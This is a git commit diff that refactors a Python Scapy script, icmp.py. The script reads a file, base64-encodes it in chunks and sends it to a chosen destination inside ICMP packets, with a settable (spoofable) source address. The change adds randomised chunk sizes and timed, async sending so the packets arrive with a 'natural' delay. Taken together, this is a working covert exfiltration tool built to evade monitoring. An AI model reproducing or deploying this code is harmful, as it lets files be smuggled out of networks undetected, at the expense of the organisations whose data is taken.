13f5b7c6bfa434bf96e428658c57ba4067bc1e1c
Smendowski <m.smendowski@gmail.com>
2021-10-27 14:46:58 +0200

    Refactoring ICMP communication on the sender's side

--- icmp.py
+++ icmp.py
@@ -1,10 +1,12 @@
 from scapy.layers.inet import IP, ICMP
 from scapy.sendrecv import send
-from typing import List, Optional
+from typing import List, Generator, Optional
 import base64
 import os.path
 import argparse
 import io
+import asyncio
+import random
 
 ICMP_PACKET = {
     "IP_HEADER_SIZE": 20,
@@ -13,11 +15,11 @@ ICMP_PACKET = {
 }
 
 
-def read_and_fragment_file(filename: str):
+def read_and_fragment_file(filename: str) -> Generator[bytes, None, None]:
     if os.path.isfile(filename):
         with open(filename, "rb") as f:
             while True:
-                chunk = f.read(io.DEFAULT_BUFFER_SIZE // 16)
+                chunk = f.read(random.randint(io.DEFAULT_BUFFER_SIZE // 16, io.DEFAULT_BUFFER_SIZE // 12))
                 if not chunk:
                     break
                 yield chunk
@@ -25,68 +27,67 @@ def read_and_fragment_file(filename: str):
         raise SystemExit
 
 
-def get_base64_encoded_chunks(chunks):
+def get_base64_encoded_file_chunks(chunks) -> Generator[bytes, None, None]:
     for chunk in chunks:
         yield base64.b64encode(chunk)
 
 
-def get_base64_encoded_file_identifier(filename: str, source: str):
+def get_base64_encoded_file_identifier(filename: str, source: str) -> bytes:
     return base64.b64encode((":".join([source, filename]).encode("ascii")))
 
 
-def get_base64_encoded_size_in_bytes(encoded: str):
+def get_base64_encoded_size_in_bytes(encoded: str) -> int:
     return int(len(encoded) * 3 / 4) - str(encoded).count('=')
 
 
-def get_chunk_with_overhead(encoded_chunk: str, sequence_number: int, encoded_id: str):
-    return str(encoded_chunk, "utf-8") + ':' + "%04d" % sequence_number + ':' + str(encoded_id, "utf-8")
+def add_overhead_to_chunk(chunk: bytes, sequence_number: int, chunk_id: bytes) -> str:
+    return str(chunk, "utf-8") + ':' + "%04d" % sequence_number + ':' + str(chunk_id, "utf-8")
 
 
-def construct_icmp_packet(data: str, destination: str, source: Optional[str] = None) -> IP:
-    return IP(dst=destination) / ICMP() / data if not source else IP(src=source, dst=destination) / ICMP() / data
+def create_icmp_payload(chunks: Generator[bytes, None, None], chunks_id: bytes):
+    for sequence_number, chunk in enumerate(chunks):
+        yield add_overhead_to_chunk(chunk=chunk, sequence_number=sequence_number + 1, chunk_id=chunks_id)
 
 
-def create_icmp_buffer(data, destination: str, **kwargs) -> list:
-    buffer = []
-    source = kwargs.get('source')
+def create_icmp_packet(data: str, source: str, destination: str) -> IP:
+    return IP(src=source, dst=destination) / ICMP() / f"{data}"
+
+
+def create_icmp_buffer(data, source: str, destination: str) -> list:
     for chunk in data:
-        yield construct_icmp_packet(data=chunk, destination=destination, source=source)
+        yield create_icmp_packet(data=chunk, source=source, destination=destination)
 
 
-def send_icmp_packets(buffer: List[IP]):
-    for packet in buffer:
-        send(packet)
+async def send_icmp_packets(buffer: List[IP], interval: int) -> None:
+    for icmp_packet in buffer:
+        send(icmp_packet)
+        await asyncio.sleep(interval)
 
 
-def show_packet_details(packet: IP):
+async def send_payload_via_icmp(payload, source: str, destination: str, interval: int) -> None:
+    icmp_buffer = create_icmp_buffer(data=payload, source=source, destination=destination)
+    await send_icmp_packets(buffer=icmp_buffer, interval=interval)
+
+
+def show_packet_details(packet: IP) -> None:
     packet.show()
 
 
-def main():
+async def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-s", "--source", help="Source IPv4 address", default='127.0.0.1', type=str)
     parser.add_argument("-d", "--destination", help="Destination IPv4 address", type=str)
-    parser.add_argument("-f", "--filename", help="Filename to send", type=str)
+    parser.add_argument("-f", "--filename", help="File's name to send", type=str)
+    parser.add_argument("-i", "--interval", help="Time interval between sending packets", default=0, type=int)
     args = parser.parse_args()
 
-    chunks = read_and_fragment_file(filename=args.filename)
-    encoded_chunks = get_base64_encoded_chunks(chunks=chunks)
+    file_chunks = read_and_fragment_file(filename=args.filename)
+    encoded_file_chunks = get_base64_encoded_file_chunks(chunks=file_chunks)
     encoded_file_identifier = get_base64_encoded_file_identifier(filename=args.filename, source=args.source)
-
-    data_to_send = []
-    for sequence_number, encoded_chunk in enumerate(encoded_chunks):
-        data_to_send.append(get_chunk_with_overhead(encoded_chunk=encoded_chunk, sequence_number=sequence_number,
-                                                    encoded_id=encoded_file_identifier))
-
-    buffer = create_icmp_buffer(data_to_send, destination=args.destination, source=args.source)
-
-    for packet in buffer:
-        show_packet_details(packet)
-
-    send_icmp_packets(buffer)
+    icmp_payload = create_icmp_payload(chunks=encoded_file_chunks, chunks_id=encoded_file_identifier)
+    await send_payload_via_icmp(payload=icmp_payload, source=args.source, destination=args.destination,
+                                interval=args.interval)
 
 
 if __name__ == '__main__':
-    main()
-
-# TODO: Introduce Asyncio and natural time delay in ICMP packet arrival.
+    asyncio.run(main())
